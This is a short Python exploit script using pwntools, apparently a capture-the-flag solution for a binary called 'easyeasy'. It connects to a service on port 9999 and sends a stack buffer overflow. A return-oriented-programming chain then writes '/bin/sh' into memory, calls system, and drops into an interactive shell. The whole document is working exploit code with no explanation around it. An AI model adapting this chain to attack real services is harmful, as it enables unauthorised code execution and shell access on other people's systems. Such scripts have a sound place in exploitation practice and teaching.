from pwn import *
import time

context.log_level ='debug'
io = remote("0.0.0.0", 9999)
# io = process("./easyeasy")

pop_rdi = 0x0000000000402373
pop_rsi = 0x0000000000402371

cin = 0x000000603080
cout = 0x0000006031C0 

system = 0x0000000000402253   
op_in = 0x0000000040228B
jmp_rax = 0x00000000004009a5

buf = 0x0000000000603f00

# gdb.attach(io)
# pause()
io.sendlineafter("You Can not pwn me", b'a'*16 + p64(buf)
    + p64(pop_rsi) + p64(buf) + p64(0x6161616161616161) 
    + p64(op_in))

# gdb.attach(io)
time.sleep(0.5)

io.sendlineafter("a"*16, b'/bin/sh\x00'
    + p64(pop_rdi) + p64(buf) 
    + p64(system))

io.interactive()